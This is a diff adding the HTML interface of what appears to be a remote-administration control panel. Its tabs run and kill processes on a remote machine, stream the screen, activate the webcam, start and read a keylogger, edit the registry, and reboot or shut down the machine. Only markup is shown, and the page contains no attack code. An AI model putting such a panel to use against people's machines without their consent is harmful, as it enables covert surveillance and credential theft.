@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Synergistic Control Final Pill - Updated v5.7</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="planet"></div>
+    <div class="planet-fog"></div>
+    <div id="meteor-container"></div>
+
+    <div id="toast-notification">
+        <div class="toast-icon">★</div>
+        <div id="toast-message">Notification content...</div>
+    </div>
+
+    <div id="customModal" class="modal-overlay">
+        <div class="modal-box" id="modalBox">
+            <h3 class="modal-title-custom" id="modalTitle">WARNING</h3>
+            <p class="modal-text-custom" id="modalText">Message goes here...</p>
+            <div class="modal-buttons">
+                <button class="btn-modal-cancel" onclick="closeModal()">CANCEL</button>
+                <button id="btnModalConfirm" class="btn-modal-confirm" onclick="confirmAction()">CONFIRM</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container py-5">
+        <div class="row">
+            <div class="col-lg-12">
+                <div class="phase-badge">PHASE 01</div>
+                <h1 class="hero-title">
+                    <span class="hero-line">BUILDING</span>
+                    <span class="hero-line">SYNERGISTIC</span>
+                    <span class="hero-line">CONTROL CENTER</span>
+                </h1>
+                <div class="subtitle">AN INNOVATIVE, NON-CUSTODIAL REMOTE ECOSYSTEM</div>
+            </div>
+        </div>
+
+        <div class="row mt-5 align-items-end">
+            <div class="col-md-3">
+                <label class="input-label">SERVER ADDRESS (IP / NGROK)</label>
+                <input type="text" id="txtIP" class="custom-input" value="127.0.0.1" placeholder="IP:Port or Ngrok URL">
+            </div>
+            <div class="col-md-3">
+                <button id="btnConnect" class="btn-connect-box w-100" onclick="connect()">CONNECT</button>
+                <button id="btnDisconnect" class="btn-disconnect-box w-100" onclick="disconnect()" style="display:none;">DISCONNECT</button>
+            </div>
+            <div class="col-md-6 d-flex align-items-center h-100 pb-2">
+                <div class="status-divider"></div>
+                <span class="status-text" id="statusText">STATUS: DISCONNECTED</span>
+            </div>
+        </div>
+
+        <ul class="nav nav-tabs" id="myTab" role="tablist">
+            <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#tab-apps">APPLICATIONS</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-process">PROCESSES</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-screen">LIVE STREAM</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-webcam">WEBCAM</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-keylog">KEYLOGGER</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-registry">REGISTRY</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-power">POWER</a></li>
+        </ul>
+
+        <div class="tab-content">
+
+            <div class="tab-pane fade show active" id="tab-apps">
+                <div class="row mb-4 align-items-end">
+                    <div class="col-md-6">
+                        <label class="input-label">RUN APPLICATION</label>
+                        <div class="d-flex gap-2">
+                            <input type="text" id="txtAppName" class="custom-input" placeholder="e.g. notepad, calc, chrome...">
+                            <button class="btn-hatom" onclick="startProcess()">START APP</button>
+                        </div>
+                    </div>
+                    <div class="col-md-6 text-end">
+                        <button class="btn-hatom" onclick="sendCommand('GET_APPS')">REFRESH LIST</button>
+                    </div>
+                </div>
+
+                <div style="height: 450px; overflow-y: auto;">
+                    <table class="table table-hover">
+                        <thead><tr><th>WINDOW TITLE</th><th>EXECUTABLE</th><th>PID</th><th class="text-end">ACTION</th></tr></thead>
+                        <tbody id="appTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tab-process">
+                <div class="row mb-3">
+                    <div class="col-md-12">
+                        <label class="input-label">START NEW PROCESS</label>
+                        <div class="d-flex gap-2">
+                            <input type="text" id="txtProcName" class="custom-input" placeholder="e.g. cmd, powershell, explorer...">
+                            <button class="btn-hatom" onclick="startProcessTab()">RUN</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row mb-4 align-items-end">
+                    <div class="col-md-4">
+                        <label class="input-label">TARGET PROCESS (PID)</label>
+                        <input type="text" id="txtKillID" class="custom-input" placeholder="Enter PID...">
+                    </div>
+                    <div class="col-md-8 d-flex gap-3 pt-3">
+                        <button class="btn-hatom btn-hatom-danger" onclick="killProcess()">KILL</button>
+                        <button class="btn-hatom ms-auto" style="border-style: dashed; opacity: 0.7;" onclick="sendCommand('XEM')">SCAN ALL</button>
+                    </div>
+                </div>
+                <div style="height: 450px; overflow-y: auto;">
+                    <table class="table table-sm table-hover">
+                        <thead><tr><th>NAME</th><th>PID</th><th class="text-end">SELECT</th></tr></thead>
+                        <tbody id="processTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tab-screen">
+                <div class="d-flex align-items-center mb-4 position-relative" style="min-height: 50px;">
+                    <div class="w-100 d-flex justify-content-center gap-3">
+                        <button class="btn-hatom" id="btnTakeSnap" onclick="takeSnapshot()">SNAPSHOT</button>
+                        <button class="btn-hatom" id="btnStartStream" style="background: rgba(255,255,255,0.05);" onclick="startStream()">START STREAM</button>
+                        <button class="btn-hatom btn-hatom-danger" id="btnStopStream" onclick="stopStream()">STOP</button>
+                    </div>
+
+                    <div class="position-absolute end-0 me-3" style="display: flex; gap: 10px;">
+                        <button class="btn-hatom-green" id="btnSaveSnap" style="display:none;" onclick="saveSnapshot()">SAVE IMAGE</button>
+                        <button class="btn-hatom-green" id="btnRecordStream" style="display:none;" onclick="toggleRecording()">START RECORD</button>
+                    </div>
+                </div>
+
+                <div class="glass-frame">
+                    <img id="screenImg" style="display:none;" />
+                    <canvas id="recordingCanvas" style="display:none;"></canvas>
+                    <div id="screenOffline" class="scan-overlay">
+                        <div class="scan-grid"></div>
+                        <div class="scan-line"></div>
+                        <div class="scan-text">WAITING FOR SIGNAL</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tab-webcam">
+                <div class="d-flex align-items-center mb-4 position-relative" style="min-height: 50px;">
+                    <div class="w-100 d-flex justify-content-center gap-3">
+                        <button class="btn-hatom" style="background: rgba(255,255,255,0.05);" onclick="startWebcam()">ACTIVATE CAM</button>
+                        <button class="btn-hatom btn-hatom-danger" onclick="stopWebcam()">DEACTIVATE</button>
+                    </div>
+
+                    <div class="position-absolute end-0 me-3">
+                        <button class="btn-hatom-green" id="btnRecordWebcam" style="display:none;" onclick="toggleWebcamRecording()">START RECORD</button>
+                    </div>
+                </div>
+
+                <div class="glass-frame">
+                    <img id="webcamImg" style="display:none;" />
+                    <canvas id="webcamCanvas" style="display:none;"></canvas>
+                    <div id="webcamOffline" class="scan-overlay">
+                        <div class="scan-grid"></div>
+                        <div class="scan-line"></div>
+                        <div class="scan-text">CAMERA OFFLINE</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tab-keylog">
+                <div class="d-flex gap-2 mb-3">
+                    <button class="btn-hatom" onclick="sendCommand('HOOK')">START HOOK</button>
+                    <button class="btn-hatom btn-hatom-danger" onclick="sendCommand('UNHOOK')">STOP HOOK</button>
+                    <button class="btn-hatom" onclick="sendCommand('PRINT')">GET LOGS</button>
+                    <button class="btn-hatom" onclick="saveKeylogs()">SAVE LOGS</button>
+                    <button class="btn-hatom ms-auto" onclick="document.getElementById('logArea').value=''">CLEAR</button>
+                </div>
+                <textarea id="logArea" class="form-control rounded-0" style="height: 450px; background: #000; color: #ccff00; border: 1px solid #333; font-family: monospace; padding: 15px; border-radius: 12px;"></textarea>
+            </div>
+
+            <div class="tab-pane fade" id="tab-registry">
+                <div class="row">
+                    <div class="col-md-4 border-end border-secondary pe-4">
+                        <label class="input-label mt-2">ACTION</label>
+                        <select id="regAction" class="custom-input mb-3"><option>Get value</option><option>Set value</option><option>Delete value</option></select>
+                        <label class="input-label mt-2">KEY PATH</label>
+                        <input type="text" id="regLink" class="custom-input mb-3" placeholder="e.g. SOFTWARE\Microsoft...">
+                        <label class="input-label mt-2">VALUE NAME</label>
+                        <input type="text" id="regName" class="custom-input mb-3">
+                        <label class="input-label mt-2">DATA</label>
+                        <input type="text" id="regValue" class="custom-input mb-3">
+                        <label class="input-label mt-2">TYPE</label>
+                        <select id="regType" class="custom-input mb-4"><option>String</option><option>DWord</option></select>
+                        <button class="btn-connect-box w-100" onclick="sendRegistry()">EXECUTE</button>
+                    </div>
+                    <div class="col-md-8 ps-4">
+                        <label class="input-label">OUTPUT</label>
+                        <textarea id="regResult" class="form-control rounded-0 h-100" style="background: transparent; border: 1px solid #333; color: #ccc; padding: 15px; border-radius: 12px;"></textarea>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tab-power">
+                <div class="glass-frame" style="flex-direction: column;">
+                    <h2 class="hero-title text-center mb-5" style="font-size: 2rem; text-shadow: 0 0 20px rgba(255,255,255,0.2);">
+                        SYSTEM POWER CONTROL
+                    </h2>
+
+                    <div class="row w-100 justify-content-center g-4">
+                        <div class="col-md-4 text-center">
+                            <div class="p-4" style="border: 1px dashed rgba(204, 255, 0, 0.3); border-radius: 20px; background: rgba(204, 255, 0, 0.05);">
+                                <div style="font-size: 3rem; color: #ccff00; margin-bottom: 1rem;">↻</div>
+                                <h4 class="mb-3" style="color: #fff; letter-spacing: 2px;">REBOOT SYSTEM</h4>
+                                <p class="status-text mb-4" style="font-size: 0.7rem;">RESTARTS THE REMOTE MACHINE AND SERVICES.</p>
+                                <button class="btn-connect-box w-100" onclick="openModal('reboot')">
+                                    EXECUTE RESTART
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="col-md-4 text-center">
+                            <div class="p-4" style="border: 1px dashed rgba(255, 59, 90, 0.3); border-radius: 20px; background: rgba(255, 59, 90, 0.05);">
+                                <div style="font-size: 3rem; color: #ff3b5a; margin-bottom: 1rem;">⏻</div>
+                                <h4 class="mb-3" style="color: #fff; letter-spacing: 2px;">SHUTDOWN</h4>
+                                <p class="status-text mb-4" style="font-size: 0.7rem;">PERMANENTLY TURNS OFF THE REMOTE MACHINE.</p>
+                                <button class="btn-connect-box w-100"
+                                        style="background-color: #ff3b5a; border-color: #ff3b5a; color: #fff; box-shadow: 0 0 15px rgba(255, 59, 90, 0.4);"
+                                        onmouseover="this.style.backgroundColor='#ff6b85'; this.style.boxShadow='0 0 30px #ff3b5a';"
+                                        onmouseout="this.style.backgroundColor='#ff3b5a'; this.style.boxShadow='0 0 15px rgba(255, 59, 90, 0.4)';"
+                                        onclick="openModal('shutdown')">
+                                    EXECUTE SHUTDOWN
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-5 text-center">
+                        <span class="status-text" style="color: #ff33cc; animation: pulseText 2s infinite;">⚠ WARNING: ACTIONS ARE IRREVERSIBLE</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="script.js"></script>
+</body>
+</html>
